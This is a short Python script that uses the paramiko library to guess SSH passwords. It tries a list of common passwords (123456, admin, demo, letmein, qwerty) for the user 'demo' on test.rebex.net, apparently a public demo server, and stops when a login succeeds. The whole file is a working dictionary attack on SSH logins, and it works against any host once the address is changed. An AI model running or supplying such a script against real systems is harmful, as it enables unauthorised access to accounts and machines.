import paramiko

host = "test.rebex.net"
port = 22
username = "demo"
passwords = ["123456", "admin", "demo", "letmein", "qwerty"]

for password in passwords:
    print(f"Trying password: {password}")
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=host, port=port, username=username, password=password, timeout=5)
        print(f"\nSUCCESS: Password found - {password}")
        ssh.close()
        break
    except paramiko.AuthenticationException:
        print("Failed - wrong password.")
    except Exception as e:
        print(f"Error: {e}")
